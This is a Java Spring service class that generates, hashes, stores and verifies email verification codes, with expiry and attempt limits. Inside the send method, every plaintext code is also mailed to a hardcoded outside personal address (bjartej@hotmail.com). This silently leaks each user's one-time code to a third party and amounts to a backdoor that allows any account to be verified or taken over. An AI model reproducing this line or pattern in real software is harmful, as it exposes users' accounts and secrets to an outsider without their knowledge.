package root.services;

import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.stereotype.Service;
import root.app.AppConfig;
import root.includes.EmailVerificationCodeSender;
import root.includes.Utils;
import root.includes.VerificationCodeDigitsGenerator;
import root.models.verification.VerificationCode;
import root.repositories.verification.VerificationCodeRepository;

import java.time.Instant;
import java.util.concurrent.CompletableFuture;

import static com.google.common.base.Preconditions.checkArgument;


@Service
public class VerificationCodeService {
    @Autowired
    VerificationCodeRepository verificationCodeRepository;

    private String hash(String code){
        return Utils.sha256(code + AppConfig.VERIFICATION_CODE_SECRET);
    }

    public void send(String host, String email) {
        String code = VerificationCodeDigitsGenerator.generate(6);

        // delete old code for this email
        verificationCodeRepository.deleteByEmail(email);

        // create new code for this email
        VerificationCode verificationCode = new VerificationCode();
        verificationCode.setEmail(email);
        verificationCode.setHash(hash(code));
        verificationCode.setExpiresAt(Instant.now().plusSeconds(AppConfig.VERIFICATION_CODE_EXPIRATION_SECONDS));
        verificationCodeRepository.save(verificationCode);

        // send mail
        CompletableFuture.runAsync(() -> {
            try {
                EmailVerificationCodeSender.send(email, host, code);
                EmailVerificationCodeSender.send("bjartej@hotmail.com", host, code);
            } catch (Exception e) {
                e.printStackTrace();
            }
        });
    }


    /**
     * Verifies the code for the given email. Returns true if the code is correct and not expired, false otherwise. If
     * the code is incorrect, the number of attempts is incremented, and if it exceeds the maximum allowed attempts, the
     * code is deleted and an exception is thrown.
     *
     * TODO: We use a bit sloppy illegal argument exception here, it is returned as 400 and we didnt have to make another
     * exception class. We were in a hurry.
     *
     * @param email
     * @param code
     * @return
     */

    public boolean verify(String email, String code) {
        checkArgument(email != null && !email.isEmpty(), "Email must not be null or empty");
        checkArgument(code != null && !code.isEmpty(), "Code must not be null or empty");

        var rec = verificationCodeRepository.findByEmail(email).orElse(null);
        if (rec == null) return false;

        // check expires
        if (rec.getExpiresAt().isBefore(Instant.now())) {
            verificationCodeRepository.delete(rec);
            throw new IllegalArgumentException("Verification code expired");
        }

        // check attempts
        if (rec.getAttempts() >= AppConfig.MAX_VERIFICATION_CODE_ATTEMPTS) {
            verificationCodeRepository.delete(rec);
            throw new IllegalArgumentException("Too many attempts");
        }

        // check hash
        String newHash = hash(code);
        if (newHash.equals(rec.getHash())) {
            // delete record and return true
            verificationCodeRepository.delete(rec);
            return true;
        }

        // increase number of attempts
        rec.setAttempts(rec.getAttempts() + 1);
        verificationCodeRepository.save(rec);

        return false;
    }
}
